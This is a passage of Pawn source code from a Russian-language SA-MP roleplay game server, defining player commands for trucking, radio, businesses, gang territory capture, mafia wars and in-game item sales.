	PlayerInfo[playerid][pDgruz] = 0;
	Gruz[playerid] = 0;
	return true;
}
CMD:tskill(playerid)
{
	peremennn[playerid] = 0;
	if(PlayerInfo[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	new gtext[7];
	switch(Gruz[playerid])
	{
	case 1: gtext ="Нефть";
	case 2: gtext ="Уголь";
	case 3: gtext ="Дерево";
	case 0: gtext ="Нет";
	}
	new gaatext[7];
	switch(PlayerInfo[playerid][pDLevel])
	{
	case 1..4: gaatext ="11т";
	case 5..14: gaatext ="21т.";
	case 15..24: gaatext ="35т.";
	case 25..26: gaatext ="50т.";
	}
	new level = PlayerInfo[playerid][pDLevel];
	new exp = PlayerInfo[playerid][pDExp];
	new expamount = level*levelDexp;
	new gruz = PlayerInfo[playerid][pDgruz];
	new mazgruz = PlayerInfo[playerid][pDMgruz];
	new msg[] = "Навык:\n\tLVL: %i\n\tExp: %i / %i\nФура:\n\tМакс груз: %iт.\n\tЗагружено: %iт. из %s\nГруз: %s";
	format(YCMDstr, 128, msg,level,exp,expamount,mazgruz,gruz,gaatext,gtext);
	ShowPlayerDialogEx(playerid,31999,0, "Статистика Дальнобойщика",YCMDstr, "Готово", "");
	return true;
}
CMD:queststats(playerid, params[])
{
	QuestStats(playerid,playerid);
	return true;
}
CMD:tmonitor(playerid, params[])
{
	peremennn[playerid] = 0;
	if(PlayerInfo[playerid][pJob] != 99)return SCM(playerid,COLOR_GREY, " Вы не Дальнобойщик");
	if(!IsAtTPlace(playerid)) return SCM(playerid,0x81DA99AA," Вы должны находиться в порту, или на складе");
	new msg1[] = "[Заводы]\nНефтезавод №1 Цена 1т: \n\t%i\nНефтезавод №2 Цена 1т: \n\t%i\nСклад угля №1 Цена 1т: \n\t%i\nСклад угля №2 Цена 1т:\n\t%i\nЛесопилка №1 Цена 1т:\n\t%i\nЛесопилка №2 Цена 1т: \n\t%i\n\n[Порты]\nПорт ЛС, Цена 1т:\n\tНефть: %i\n\tУголь: %i\n\tДерево: %i\nПорт СФ, Цена 1т:\n\tНефть: %i\n\tУголь: %i\n\tДерево: %i";
	format(YCMDstr, 500, msg1,Benzbuy[0],Benzbuy[1],ugolbuy[0],ugolbuy[1],Buyderevo[0],Buyderevo[1],Sellbenz[0],Sellugol[0],Sellderevo[0],Sellbenz[1],Sellugol[1],Sellderevo[1]);
	ShowPlayerDialogEx(playerid,31998,0, "Сообщение",YCMDstr, "Выбрать", "Назад");
	return true;
}
CMD:taxiskill(playerid)
{
	format(YCMDstr, sizeof(YCMDstr), " Ваш уровень таксиста %i. До следующего осталось %i/%i exp",PlayerInfo[playerid][ptaxilvl], PlayerInfo[playerid][ptaxiexp], PlayerInfo[playerid][ptaxilvl]*8);
	SCM(playerid, COLOR_BLUE, YCMDstr);
	return true;
}
CMD:radio(playerid, params[])
{
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /switchwave [номер]");
		SCM(playerid, -1, " [0] Выключить");
		SCM(playerid, -1, " [1] SF News");
		SCM(playerid, -1, " [2] LS News");
		SCM(playerid, -1, " [3] LV News");
		return true;
	}
	switch (params[0])
	{
	case 1:
		{
			lNews[playerid] = 1;
			gNews[playerid] = 0;
			LvNews[playerid] = 1;
			SCM(playerid, -1, " Волна переключена на SF News");
		}
	case 2:
		{
			lNews[playerid] = 0;
			gNews[playerid] = 1;
			LvNews[playerid] = 1;
			SCM(playerid, -1, " Волна переключена на LS News");
		}
	case 3:
		{
			lNews[playerid] = 1;
			gNews[playerid] = 1;
			LvNews[playerid] = 0;
			SCM(playerid, -1, " Волна переключена на LV News");
		}
	case 0:
		{
			lNews[playerid] = 1;
			gNews[playerid] = 1;
			LvNews[playerid] = 1;
			SCM(playerid, -1, " Радио отключено");
		}
	}
	return true;
}
CMD:instopen(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] != 11 && PlayerInfo[playerid][pLeader] != 11 && TakingLesson[playerid] != 1) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(!PlayerToPoint(8.0,playerid,-2074.50000000,-94.90000153,35.00000000)) return true;
	MoveObject(licgate, -2074.50000000,-94.90000153,35.00000000+0.020,0.020, 0.00,0.00,90.00);
	SetTimer("LicClose", 8000, 0);
	SCM(playerid, 0x6495EDFF, " Шлакбаум опустится через 8 секунд");
	return true;
}
CMD:prodopen(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 5) return true;
	if(!PlayerToPoint(10.0,playerid,2203.8630371094,-2252.1179199219,13.5)) return true;
	MoveObject(gruzgate, 2203.7639160156,-2252.0598117188,13.40+0.120,0.120, 0.00,0.00,316.00);
	SetTimer("GruzClose", 8000, 0);
	SCM(playerid, 0x6495EDFF, " Шлакбаум опустится через 8 секунд");
	return true;
}
CMD:myhouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10) return true;
	if(!PlayerToPoint(20.0,playerid,227.54, 1030.38, 1084.01)) return true;
	if(modern)
	{
	    SCM(playerid, -1, " Вы убрали Modern-панель дома");
		MoveObject(modernhouse[0], 231.84, 1028.48, 1081.11, 0.5, 0, 0, 0); // down
		MoveObject(modernhouse[1], 231.84, 1034.01, 1081.11, 0.5, 0, 0, 0);
		MoveObject(modernhouse[2], 231.84, 1035.60, 1081.11, 0.5, 0, 0, 0);
		MoveObject(modernhouse[3], 231.13, 1031.17, 1079.75, 0.5, 0, 0, -90);
		MoveObject(modernhouse[4], 231.13, 1033.43, 1079.75, 0.5, 0, 0, -90);
		MoveObject(modernhouse[5], 231.13, 1026.95, 1079.75, 0.5, 0, 0, -90);
		MoveObject(modernhouse[6], 227.06, 1036.37, 1081.11, 0.5, 0, 0, 90);
		MoveObject(modernhouse[7], 229.13, 1035.73, 1079.75, 0.5, 0, 0, 0);
		MoveObject(modernhouse[8], 226.16, 1035.73, 1079.75, 0.5, 0, 0, 0);
		MoveObject(modernhouse[9], 225.21, 1036.27, 1082.15, 0.5, 0, 0, 0);
		MoveObject(modernhouse[10], 231.72, 1030.21, 1081.17, 0.5, 0, 0, -90);

		MoveObject(modernhouse[11], 218.88, 1036.37, 1087.79, 1.0, 0, 0, 90); // left
		MoveObject(modernhouse[12], 220.55, 1036.22, 1088.64, 1.0, 0, 0, 0);
		
		MoveObject(modernhouse[13], 230.17, 1026.02, 1092.56, 0.5, 0, 0, 0); // up
		MoveObject(modernhouse[14], 230.18, 1033.29, 1092.61, 0.5, 0, 0, 0);
		MoveObject(modernhouse[15], 225.47, 1036.37, 1094.90, 0.5, 0, 0, 90);
		
		MoveObject(modernhouse[16], 231.39, 1022.07, 1082.98, 0.5, 0, 0, 42.40); // rigth
		modern = false;
	}
	else
	{
	    SCM(playerid, -1, " Вы вернули Modern-панель дома");
		MoveObject(modernhouse[0], 231.84, 1028.48, 1084.35, 0.5, 0, 0, 0); // down
		MoveObject(modernhouse[1], 231.84, 1034.01, 1084.35, 0.5, 0, 0, 0);
		MoveObject(modernhouse[2], 231.84, 1035.60, 1084.35, 0.5, 0, 0, 0);
		MoveObject(modernhouse[3], 231.13, 1031.17, 1082.98, 0.5, 0, 0, -90);
		MoveObject(modernhouse[4], 231.13, 1033.43, 1082.98, 0.5, 0, 0, -90);
		MoveObject(modernhouse[5], 231.13, 1026.95, 1082.98, 0.5, 0, 0, -90);
		MoveObject(modernhouse[6], 227.06, 1036.37, 1084.35, 0.5, 0, 0, 90);
		MoveObject(modernhouse[7], 229.13, 1035.73, 1082.98, 0.5, 0, 0, 0);
		MoveObject(modernhouse[8], 226.16, 1035.73, 1082.98, 0.5, 0, 0, 0);
		MoveObject(modernhouse[9], 225.21, 1036.27, 1085.38, 0.5, 0, 0, 0);
		MoveObject(modernhouse[10], 231.72, 1030.21, 1084.41, 0.5, 0, 0, -90);
		
	 	MoveObject(modernhouse[11], 225.47, 1036.37, 1087.79, 1.0, 0, 0, 90); // left
	 	MoveObject(modernhouse[12], 227.14, 1036.22, 1088.64, 1.0, 0, 0, 0);
		
		MoveObject(modernhouse[13], 230.17, 1026.02, 1088.89, 0.5, 0, 0, 0); // up
		MoveObject(modernhouse[14], 230.18, 1033.29, 1088.94, 0.5, 0, 0, 0);
		MoveObject(modernhouse[15], 225.47, 1036.37, 1091.23, 0.5, 0, 0, 90);
		
		MoveObject(modernhouse[16], 231.39, 1024.07, 1082.98, 0.5, 0, 0, 42.40); // rigth
		modern = true;
		printf("Администратор %s вернул Modern-панель дома", Name(playerid));
	}
	return true;
}
CMD:givenewskeys(playerid, params[])
{
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /givenewskeys [id]");
	if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(!IsPlayerConnected(params[0])) return true;
		if(params[0] == INVALID_PLAYER_ID) return true;
		if(PlayerInfo[params[0]][pNkeys] >= 1)
		{
			PlayerInfo[params[0]][pNkeys] = 0;
			format(YCMDstr, sizeof(YCMDstr), " %s забрал пропуск у %s в студию новостей",PlayerInfo[playerid][pName],Name(params[0]));
		}
		else
		{
			if(PlayerInfo[playerid][pAdmin] >= 1) PlayerInfo[params[0]][pNkeys] = 1;
			else PlayerInfo[params[0]][pNkeys] = PlayerInfo[playerid][pMember];
			format(YCMDstr, sizeof(YCMDstr), " %s выдал пропуск %s в студию новостей",PlayerInfo[playerid][pName],Name(params[0]));
		}
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else SCM(playerid, 0xafafafaa, " Вам недоступна эта функция!");
	return true;
}
CMD:npanel(playerid, params[])
{
	if(PlayerInfo[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	new model = GetVehicleModel(GetPlayerVehicleID(playerid));
	if(model != 582 && model != 488 &&  !PlayerToPoint(30.0,playerid,2648.8855,1224.7946,41.0859) && !PlayerToPoint(30.0,playerid,-2052.6719,473.1645,191.0859) && !PlayerToPoint(30.0,playerid,1656.0978,-1623.1172,101.0859)) return SCM(playerid, COLOR_GRAD1, " Вы не в репортёрской машине / вертолёте / офисе!");
 	if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pMember] == 20)
 	    ShowPlayerDialogEx(playerid, 2223, DIALOG_STYLE_LIST, "Меню репортёра", "[0] Прямой эфир\n[1] Выйти из прямого эфира\n[2] Начать принимать звонки/смс\n[3] Завершить принимать звонки/смс\n[4] Взять интервью\n[5] Завершить интервью\n[6] Объявления\n[7] Банк\n[8] Раздел лидера\n[9] Голосование", "Выбор", "Отмена");
 	else return SCM(playerid, COLOR_GREY, " Вы не репортер!");
	return true;
}
CMD:selldrugs(playerid, params[])
{
	if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вы не бандит");
	if(sscanf(params, "udd", params[0],params[1],params[2])) return SCM(playerid, -1, " Введите: /selldrugs [id] [кол-во] [Цена]");
	if(params[1] < 1 || params[1] > 150) { SCM(playerid, COLOR_GREY, " Вес не может быть меньше 1 и больше 150!"); return true; }
	if(params[2] < 1 || params[2] > 5000) { SCM(playerid, COLOR_GREY, " Цена не может быть меньше 1 и больше 5000 вирт!"); return true; }
	if(params[1] > PlayerInfo[playerid][pDrugs]) { SCM(playerid, COLOR_GREY, " У вас нет столько наркотиков!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Вы должны находиться рядом друг с другом");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете продать себе наркотики!");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s купить %i грамм наркоты за %i вирт",Name(params[0]),params[1],params[2]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " %s предлагает вам купить %i грам наркоты за %i вирт. (( Введите /accept drugs для покупки ))",PlayerInfo[playerid][pName],params[1],params[2]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SetPVarInt(playerid,"Offer",params[0]);
	DrugOffer[params[0]] = playerid;
	DrugPrice[params[0]] = params[2];
	DrugGram[params[0]] = params[1];
	return true;
}
CMD:quitjob(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 65 && avtocar[playerid] > 0) PlayerInfo[playerid][pSkilla]--;
	PlayerInfo[playerid][pJob] = 0;
	SCM(playerid, -1, " Вы уволились");
	printf("Игрок %s уволился с работы", Name(playerid));
	return true;
}
CMD:sellbiz(playerid)
{
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GREY, " Вы не владеете бизнесом");
	new bouse = PlayerInfo[playerid][pPBizzKey];
	if(strcmp(PlayerInfo[playerid][pName], BizzInfo[PlayerInfo[playerid][pPBizzKey]][bOwner], true) == 0)
	{
		if(PlayerToPoint(5, playerid,BizzInfo[bouse][bEntranceX], BizzInfo[bouse][bEntranceY], BizzInfo[bouse][bEntranceZ]) || PlayerToPoint(5, playerid,BizzInfo[bouse][bBarX], BizzInfo[bouse][bBarY], BizzInfo[bouse][bBarZ]))
		{
			BizzInfo[bouse][bLocked] = 1;
			BizzInfo[bouse][bProducts] = 0;
			strmid(BizzInfo[bouse][bOwner], "None", 0, strlen("None"), 32);
			PlayerInfo[playerid][pBank] +=BizzInfo[bouse][bTill]+BizzInfo[bouse][bLandTax];
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			format(string,40,"~w~business in sold~n~~g~$%i",BizzInfo[bouse][bTill]+BizzInfo[bouse][bLandTax]);
			GameTextForPlayer(playerid,string, 5000, 3);
			BizzInfo[bouse][bTill] = 0;
			BizzInfo[bouse][bPrice] = 0;
			BizzInfo[bouse][bMafia] = 0;
			BizzInfo[bouse][bLandTax] = 0;
			BizzPay[bouse] = 0;
			BizzInfo[bouse][bLicense] = 0;
			BGet(playerid);
			format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[bouse][bMessage],BizzInfo[bouse][bBuyPrice]);
			UpdateDynamic3DTextLabelText(BizzInfo[bouse][bLabel], COLOR_GREEN, YCMDstr);
			printf("Игрок %s продал свой бизнес", Name(playerid));
			return true;
		}
	}
	return true;
}
CMD:capture(playerid, params[])
{
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6) return SCM(playerid, 0xFFD5BBAA, " Не флуди!");
	Flood[playerid] = 1;
	if(IsABiker(playerid))
	{
		new YCMDstrs[2048];
	    if(PlayerInfo[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Доступно с 7 ранга");
	    format(YCMDstrs, sizeof(YCMDstrs), "");//"Объект\tБайкеры\n");
	    for(new i = 1; i <= TOTALFARM; i++)
	    {
			if(FarmInfo[i][isCaptured]) format(string, sizeof(string), "{FF0000}Ферма №%i [%s]\n", i-1, GetNameOfBiker(FarmInfo[i][fBiker]));
			else format(string, sizeof(string), "{FFFFFF}Ферма №%i [%s]\n", i-1, GetNameOfBiker(FarmInfo[i][fBiker]));
			strcat(YCMDstrs, string);
		}
		for(new i = 1; i <= TOTALSHOPS; i++)
		{
		    if(WorkshopInfo[i][isCaptured]) format(string, sizeof(string), "{FF0000}Мастерская №%i [%s]\n", i-1, GetNameOfBiker(WorkshopInfo[i][wBiker]));
			else format(string, sizeof(string), "{FFFFFF}Мастерская №%i [%s]\n", i-1, GetNameOfBiker(WorkshopInfo[i][wBiker]));
			strcat(YCMDstrs, string);
		}
		ShowPlayerDialogEx(playerid, 19270, DIALOG_STYLE_LIST, "Выберите объект", YCMDstrs, "Атаковать", "Отмена");
	}
	else if(IsAGang(playerid))
	{
		if(FrakCD[PlayerInfo[playerid][pMember]] != 0) return SCM(playerid,COLOR_GREY," Ваша банда уже воюет / воевала за территорию в этом часу.");
		if(!IsInAllowed(playerid)) return SCM(playerid,COLOR_GRAD1, " Данная команда доступна с 7 ранга");
		new tmphour, tmpminute, tmpsecond;
		gettime(tmphour, tmpminute, tmpsecond);
		tmphour = shifthour;
		for(new i = 1; i <= TOTALGZ; i++)
		{
			if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) && GZInfo[i][gFrakVlad] != PlayerInfo[playerid][pMember] && ZoneOnBattle[i]==0)
			{
				new playerss = 0;
				foreach(m)
				{
					if(PlayerInfo[m][pMember] == GZInfo[i][gFrakVlad]) playerss++;
				}
				if(playerss == 0) return SCM(playerid, COLOR_GREY, " Игроки этой банды отсутствуют");
				if(FrakCD[GZInfo[i][gFrakVlad]] != 0) return SCM(playerid,COLOR_GRAD1," Нападаемая банда уже воюет / воевала за территорию в этом часу");
				if(IsARespawn(playerid)) return SCM(playerid,-1," Нельзя захватить эту территорию");
				FrakCD[GZInfo[i][gFrakVlad]] = 1;
				FrakCD[PlayerInfo[playerid][pMember]] = 1;
				format(YCMDstr,sizeof(YCMDstr), " [Внимание]: Ваша банда напала на территорию %s. Инициировал(а) %s",GetGangName(GZInfo[i][gFrakVlad]), Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x00B953AA,YCMDstr);
				format(YCMDstr,sizeof(YCMDstr), " [Внимание]: На вашу территорию напала банда %s",GetGangName(PlayerInfo[playerid][pMember]));
				SendFamilyMessage(GZInfo[i][gFrakVlad],0xFF8CEFAA,YCMDstr);
				GangZoneFlashForAll(GZInfo[i][gZone],GetGZColorF(PlayerInfo[playerid][pMember]));
				SCM(playerid,-1," Территория будет мигать 10 минут. Победит банда, которая останется последней");
				SCM(playerid,-1," Территория будет мигать до тех пор, пока на ней не останется 1 банда");
				new str[64];
				switch(GZInfo[i][gFrakVlad])
				{
				case 12: str="Ballas";
				case 13: str="Vagos";
				case 15: str="Grove";
				case 17: str="Aztecas";
				case 18: str="Rifa";
				}
				switch(PlayerInfo[playerid][pMember])
				{
				case 12: str2="Ballas";
				case 13: str2="Vagos";
				case 15: str2="Grove";
				case 17: str2="Aztecas";
				case 18: str2="Rifa";
				}
				format(string,128," {BEBEBE}Банда %s напала на банду %s.",str2,str);
				SendAdminMessage(0x00a86bAA,string);
				GZSafeTime[i] = 600;
				GZInfo[i][gNapad] = PlayerInfo[playerid][pMember];
				ZoneOnBattle[i] = 1;
				if(playerss == 0) GZSafeTime[i] = 0;
				break;
			}
		}
	}
	return true;
}
CMD:mafiawar(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin] || !IsAMafia(playerid) || PlayerInfo[playerid][pRank] < 6) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(WarStart > 0) return SCM(playerid, COLOR_GREY," В данное время нельзя начать войну!");
	if(sscanf(params, "d",params[0x0]) || params[0x0] < 1 || params[0x0] > 2) return SCM(playerid, -1," Введите: /mafiawar [id стрелы (1 - Заброшенный аэропорт | 2 - Карьер)]");
	for(new b = 1; b <= TotalBizz; b++)
	{
		if(PlayerToPoint(3, playerid,BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bMafia] != PlayerInfo[playerid][pMember])
		{
			if(BizzInfo[b][bMafia] == 0) return BizzInfo[b][bMafia] = PlayerInfo[playerid][pMember], SCM(playerid, COLOR_GREY, " Бизнес взят под контроль");
			WarStart = 7200;
			format(YCMDstr,144, " Вы набили стрелку %s. Бизнес: %s. Место встречи: Территория [ID %i]",GetMafiaName(BizzInfo[b][bMafia]), BizzInfo[b][bMessage],params[0x0]);
			SendFamilyMessage(PlayerInfo[playerid][pMember],0x114D71AA,YCMDstr);
			SendFamilyMessage(PlayerInfo[playerid][pMember],0x114D71AA, "Встреча через 20 минут");
			format(YCMDstr,144, " %s набила вам стрелку. Бизнес: %s. Место встречи: Территория [ID %i]",GetMafiaName(PlayerInfo[playerid][pMember]),BizzInfo[b][bMessage],params[0x0]);
			SendFamilyMessage(BizzInfo[b][bMafia],COLOR_RED,YCMDstr);
			SendFamilyMessage(BizzInfo[b][bMafia],COLOR_RED, " Встреча через 20 минут");
			BizzInfo[b][bCapture] = PlayerInfo[playerid][pMember];
			MFrakCD[PlayerInfo[playerid][pMember]] = 1200;
			MFrakCD[BizzInfo[b][bMafia]] = 1200;
			ZoneID = params[0x0];
			ZoneTimer = 2000;
			if(ZoneID == 1) ZoneWar = GangZoneCreate(351.314666, 2455.576416, 439.314666, 2551.576416);
			else if(ZoneID == 2) ZoneWar = GangZoneCreate(393.8914,983.9361, 324.6188,833.3795);
			else ZoneWar = GangZoneCreate(-789.8281,2015.9144, -662.7654,2083.9297);
			GangZoneShowForAll(ZoneWar, 0xB2B2B2AA);
			GangZoneFlashForAll(ZoneWar,COLOR_RED);
			MzCheckTimer = SetTimer("MzCheck", 1000,1);
		}
	}
	return true;
}
CMD:bizlist(playerid, params[])
{
	if(!IsAMafia(playerid)) return true;
	new strrr[1000];
	for(new h = 1; h <= TotalBizz; h++) if(BizzInfo[h][bMafia] == PlayerInfo[playerid][pMember]) format(YCMDstr, sizeof(YCMDstr), " [%i] %s\n",h, BizzInfo[h][bMessage]), strcat(strrr, YCMDstr);
	if (strlen(strrr) > 1) ShowPlayerDialogEx(playerid, 11349, 2, "Завоёванные бизнесы", strrr, "$", "$");
	else SCM(playerid,-1,"Нет бизнесов");
	return true;
}
CMD:bizmafia(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PlayerInfo[playerid][pPBizzKey];
	if(BizzInfo[bouse][bMafia]) return SCM(playerid,COLOR_GREY," Бизнес уже крышуют!");
	if(sscanf(params, "d", params[0]))
	{
		SCM(playerid, -1, " Введите: /bizmafia [мафия]");
		return SCM(playerid, -1," 0 - Yakuza | 1 - RM | 2 - LCN");
	}
	switch (params[0])
	{
	case 0: BizzInfo[bouse][bMafia] = 6, SCM(playerid,  -1,  " Крыша бизнеса - Yakuza");
	case 1: BizzInfo[bouse][bMafia] = 14, SCM(playerid,  -1, " Крыша бизнеса - RM");
	case 2: BizzInfo[bouse][bMafia] = 5, SCM(playerid,  -1,  " Крыша бизнеса - LCN");
	default: SCM(playerid, COLOR_GREY," Неверное значение");
	}
	return true;
}
CMD:bizenterc(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PlayerInfo[playerid][pPBizzKey];
	if(BizzInfo[bouse][bType] != 1) return SCM(playerid,COLOR_GREY," Данная команда доступна только владельцам клубов/баров");
	if(sscanf(params, "d", params[0])) return	SCM(playerid, -1, " Введите: /bizenterc [цена]");
	if(params[0] < 100 || params[0] > 9999)  return SCM(playerid, COLOR_GREY, " Минимальная цена 100, максимальная 9999 вирт");
	BizzInfo[bouse][bEntranceCost] = params[0];
	UpdateBizz(bouse);
	format(YCMDstr, sizeof(YCMDstr), " Плата за вход %i вирт.", BizzInfo[bouse][bEntranceCost]);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:bizwithdraw(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid))  return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PlayerInfo[playerid][pPBizzKey];
	if(sscanf(params, "d", params[0]))
	{
		format(YCMDstr, sizeof(YCMDstr),  " На счету бизнеса %i вирт", BizzInfo[bouse][bTill]);
		SCM(playerid, COLOR_GRAD3, YCMDstr);
		return SCM(playerid, -1, " Введите: /bizwithdraw [сумма]");
	}
	if(params[0] > BizzInfo[bouse][bTill] || params[0] < 1)  return SCM(playerid, COLOR_GRAD2, " На счету бизнеса нет столько денег!");
	if (!PlayerToPoint(100, playerid,BizzInfo[bouse][bEntranceX],BizzInfo[bouse][bEntranceY],BizzInfo[bouse][bEntranceZ]))
	{
		SCM(playerid, COLOR_GRAD2, " Вам нужно быть возле бизнеса!");
		return true;
	}
	else
	{
		PlayerInfo[playerid][pCash] +=params[0];
		BizzInfo[bouse][bTill] -= params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы забрали %i вирт, из банка бизнеса. Остаток: %i вирт",params[0],BizzInfo[bouse][bTill]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял %i вирт со счёта бизнеса", Name(playerid), params[0]);
		return true;
	}
}
CMD:bizbalance(playerid)
{
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid))  return SCM(playerid, COLOR_GRAD2, " Вы не владеете бизнесом");
	new bouse = PlayerInfo[playerid][pPBizzKey];
	SendMes(playerid, COLOR_GRAD2, " На счету бизнеса %i вирт", BizzInfo[bouse][bTill]);
	return true;
}
CMD:getbizstats(playerid, params[])
{
	new bizz[40];
	if(sscanf(params, "s[40]", bizz)) return SCM(playerid,-1," Введите: /getbizstats [название(пример: Alhambra)]");
	for(new h = 1; h <= TotalBizz; h++)
	{
		if(PlayerToPoint(3.0, playerid,BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ]) && !strcmp(bizz,BizzInfo[h][bMessage],true)) return PrintBizInfo(playerid,h);
	}
	return SCM(playerid,COLOR_GREY," Вы должны находиться возле бизнеса / неверное название бизнеса");
}
CMD:getcampos(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	new Float:x1,Float:y1,Float:z1;
	GetPlayerCameraLookAt(playerid,x1,y1,z1);
	format(YCMDstr, sizeof(YCMDstr), " GetPlayerCameraLookAt %f,%f,%f",x1,y1,z1);
	SCM(playerid,COLOR_GREY,YCMDstr);
	GetPlayerCameraPos(playerid,x1,y1,z1);
	format(YCMDstr, sizeof(YCMDstr), " GetPlayerCameraPos %f,%f,%f",x1,y1,z1);
	SCM(playerid,COLOR_GREY,YCMDstr);
	return true;
}
CMD:spwcar(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /spwcar [carid]");
	SetVehicleToRespawn(params[0]);
	printf("Администратор %s заспавнил транспорт [ID: %i]", Name(playerid), params[0]);
	return true;
}
CMD:endlesson(playerid, params[])
{
	if(TakingLesson[playerid] == 0) return SCM(playerid, COLOR_GRAD1, " Вы не сдаете экзамен на вождение!");
	LessonCar[playerid] = 0;
	LessonStat[playerid] = 0;
	TakingLesson[playerid] = 0;
	DisablePlayerRaceCheckpoint(playerid);
	RemovePlayerFromVehicleAC(playerid);
	SCM(playerid, -1, "Вы прекратили сдавать экзамен на вождение!");
	return true;
}
CMD:bizstats(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GREY, " Вы не владеете бизнесом");
	PrintBizInfo(playerid,PlayerInfo[playerid][pPBizzKey]);
	return true;
}
CMD:bizlock(playerid, params[])
{
	if(sscanf(params, "s[32]", params[0])) return SCM(playerid, -1, " Введите: /bizlock [название бизнеса]");
	new bid = 0;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(!strcmp(params[0], BizzInfo[i][bMessage], true))
		{
			bid = i;
			break;
		}
	}
	if(bid == 0) return SCM(playerid, COLOR_GREY, " Неизвестное название");
	if(PlayerInfo[playerid][pMember] == 2 && PlayerInfo[playerid][pRank] >= 5)
	{
		if(BizzInfo[bid][bLocked] == 1)
		{
			BizzInfo[bid][bLocked] = 0;
			SCM(playerid, COLOR_GRAD1, " Вы открыли бизнес");
			printf("Игрок %s открыл бизнес %i", Name(playerid), bid);
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
			if(GetPlayerID(BizzInfo[bid][bOwner]) != INVALID_PLAYER_ID)
			SendMes(GetPlayerID(BizzInfo[bid][bOwner]), COLOR_RED, " Агент ФБР %s закрыл Ваш бизнес!", PlayerInfo[playerid][pName]);
			return true;
		}
		if(BizzInfo[bid][bLocked] == 0)
		{
			BizzInfo[bid][bLocked] = 1;
			SCM(playerid, COLOR_GRAD1, " Вы закрыли бизнес");
			printf("Игрок %s закрыл бизнес %i", Name(playerid), bid);
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
			if(GetPlayerID(BizzInfo[bid][bOwner]) != INVALID_PLAYER_ID)
			SendMes(GetPlayerID(BizzInfo[bid][bOwner]), COLOR_RED, " Агент ФБР %s открыл Ваш бизнес!", PlayerInfo[playerid][pName]);
			return true;
		}
	}
	else if(PlayerInfo[playerid][pPBizzKey] == bid)
	{
		if(BizzInfo[bid][bLocked] == 0) return SCM(playerid, COLOR_GREY, " Бизнес уже открыт!");
		if(BizzInfo[bid][bProducts] <= 0 || BizzInfo[bid][bLicense] == 0) return SCM(playerid, COLOR_GREY, " В бизнесе нет продуктов или нет лицензии!");
		BizzInfo[bid][bLocked] = 0;
		BizzInfo[bid][bLockTime] = 0;
		SCM(playerid, COLOR_LIGHTRED, " Вы открыли бизнес. Всегда следите за состоянием продуктов и лицензией");
		SCM(playerid, COLOR_LIGHTRED,  " В противном случае вы можете потерять бизнес");
	}
	return true;
}
CMD:buyinterior(playerid, params[])
{
	if(!HGet(playerid)) return SCM(playerid, COLOR_GREY, " У вас нет дома");
	new bouse = PlayerInfo[playerid][pPHouseKey];
